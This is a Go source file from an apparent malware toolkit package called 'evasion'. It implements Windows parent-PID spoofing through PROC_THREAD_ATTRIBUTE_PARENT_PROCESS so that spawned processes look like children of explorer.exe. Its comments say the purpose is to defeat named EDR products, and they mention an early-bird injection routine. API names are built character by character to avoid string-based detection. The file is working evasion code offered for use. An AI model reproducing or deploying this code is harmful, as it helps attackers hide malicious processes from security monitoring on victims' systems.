//go:build windows
// +build windows

package evasion

// PPID spoofing via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
//
// When a process is created normally, its parent PID is set to the creating
// process.  EDRs (Malwarebytes, DrWeb, CrowdStrike, Kaspersky) inspect the
// process tree: an unexpected parent (cmd.exe → agent.exe) triggers an alert.
//
// PPID spoofing lets us set any living process as the visible parent:
//   explorer.exe → RuntimeBroker.exe — indistinguishable from normal Windows
//
// Implementation:
//   1. OpenProcess(PROCESS_CREATE_PROCESS) on the desired parent.
//   2. Build a PROC_THREAD_ATTRIBUTE_LIST via InitializeProcThreadAttributeList.
//   3. Add PROC_THREAD_ATTRIBUTE_PARENT_PROCESS via UpdateProcThreadAttribute.
//   4. CreateProcess with EXTENDED_STARTUPINFO_PRESENT and the attribute list.
//
// SpoofedSpawn is the general-purpose export; EarlyBirdInject calls it
// internally to auto-spoof its parent to explorer.exe.

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	procThreadAttrParentProcess uintptr = 0x00020000
	extendedStartupInfoPresent  uint32  = 0x00080000
)

// startupInfoEx mirrors STARTUPINFOEXW: a STARTUPINFOW followed immediately
// by a pointer to the PROC_THREAD_ATTRIBUTE_LIST.
// Cb in StartupInfo must be set to unsafe.Sizeof(startupInfoEx{}) so that
// CreateProcess reads the full extended structure.
type startupInfoEx struct {
	StartupInfo windows.StartupInfo
	AttrList    uintptr
}

// ppidSpoof holds the parent process handle and attribute list buffer.
// Call close() after CreateProcess returns.
type ppidSpoof struct {
	parentHandle windows.Handle
	buf          []byte // backing store for the PROC_THREAD_ATTRIBUTE_LIST
}

// newPPIDSpoof opens parentName (e.g. "explorer.exe") and builds a
// PROC_THREAD_ATTRIBUTE_LIST ready to pass to createProcessSpoofed.
func newPPIDSpoof(parentName string) (*ppidSpoof, error) {
	pid, err := findProcessByName(parentName)
	if err != nil {
		return nil, fmt.Errorf("PPID: find %q: %w", parentName, err)
	}

	const processCreateProcess = 0x0080
	h, err := windows.OpenProcess(processCreateProcess, false, pid)
	if err != nil {
		return nil, fmt.Errorf("PPID: open %q (pid %d): %w", parentName, pid, err)
	}

	initProc := modKernel32.NewProc(stackStr(
		'I', 'n', 'i', 't', 'i', 'a', 'l', 'i', 'z', 'e',
		'P', 'r', 'o', 'c', 'T', 'h', 'r', 'e', 'a', 'd',
		'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 'L', 'i', 's', 't',
	))
	updateProc := modKernel32.NewProc(stackStr(
		'U', 'p', 'd', 'a', 't', 'e',
		'P', 'r', 'o', 'c', 'T', 'h', 'r', 'e', 'a', 'd',
		'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e',
	))

	// First call: query required buffer size.
	var size uintptr
	initProc.Call(0, 1, 0, uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		windows.CloseHandle(h)
		return nil, fmt.Errorf("InitializeProcThreadAttributeList: zero size")
	}

	buf := make([]byte, size)
	attrPtr := uintptr(unsafe.Pointer(&buf[0]))

	if r, _, e := initProc.Call(attrPtr, 1, 0, uintptr(unsafe.Pointer(&size))); r == 0 {
		windows.CloseHandle(h)
		return nil, fmt.Errorf("InitializeProcThreadAttributeList: %w", e)
	}

	// Add parent-process attribute.
	if r, _, e := updateProc.Call(
		attrPtr, 0,
		procThreadAttrParentProcess,
		uintptr(unsafe.Pointer(&h)),
		unsafe.Sizeof(h),
		0, 0,
	); r == 0 {
		modKernel32.NewProc(stackStr(
			'D', 'e', 'l', 'e', 't', 'e',
			'P', 'r', 'o', 'c', 'T', 'h', 'r', 'e', 'a', 'd',
			'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 'L', 'i', 's', 't',
		)).Call(attrPtr)
		windows.CloseHandle(h)
		return nil, fmt.Errorf("UpdateProcThreadAttribute: %w", e)
	}

	return &ppidSpoof{parentHandle: h, buf: buf}, nil
}

func (s *ppidSpoof) ptr() uintptr {
	if s == nil || len(s.buf) == 0 {
		return 0
	}
	return uintptr(unsafe.Pointer(&s.buf[0]))
}

func (s *ppidSpoof) close() {
	if s == nil {
		return
	}
	if len(s.buf) > 0 {
		modKernel32.NewProc(stackStr(
			'D', 'e', 'l', 'e', 't', 'e',
			'P', 'r', 'o', 'c', 'T', 'h', 'r', 'e', 'a', 'd',
			'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 'L', 'i', 's', 't',
		)).Call(s.ptr())
	}
	if s.parentHandle != 0 {
		windows.CloseHandle(s.parentHandle)
		s.parentHandle = 0
	}
}

// createProcessSpoofed wraps CreateProcessW.
// If spoof != nil, the new process's visible parent PID is set to the spoofed
// parent and EXTENDED_STARTUPINFO_PRESENT is added to flags automatically.
// Returns ProcessInformation on success; caller closes pi.Process / pi.Thread.
func createProcessSpoofed(exe string, flags uint32, spoof *ppidSpoof) (windows.ProcessInformation, error) {
	exeW, err := windows.UTF16PtrFromString(exe)
	if err != nil {
		return windows.ProcessInformation{}, err
	}

	var si startupInfoEx
	si.StartupInfo.Cb = uint32(unsafe.Sizeof(si))

	if spoof != nil {
		si.AttrList = spoof.ptr()
		flags |= extendedStartupInfoPresent
	}

	var pi windows.ProcessInformation
	createW := modKernel32.NewProc(stackStr(
		'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'W',
	))
	r, _, e := createW.Call(
		uintptr(unsafe.Pointer(exeW)),
		0, 0, 0,
		0, // bInheritHandles = FALSE
		uintptr(flags),
		0, 0,
		uintptr(unsafe.Pointer(&si)), // STARTUPINFOEXW when spoofing
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return windows.ProcessInformation{}, fmt.Errorf("CreateProcessW(%q): %w", exe, e)
	}
	return pi, nil
}

// SpoofedSpawn launches exe with its parent PID set to parentName.
// Useful for making any child process appear as a trusted Windows component.
// Falls back to an unspoofed spawn if the parent cannot be opened.
func SpoofedSpawn(exe, parentName string) (windows.ProcessInformation, error) {
	spoof, _ := newPPIDSpoof(parentName)
	if spoof != nil {
		defer spoof.close()
	}
	flags := windows.CREATE_NO_WINDOW | windows.CREATE_NEW_CONSOLE
	return createProcessSpoofed(exe, uint32(flags), spoof)
}
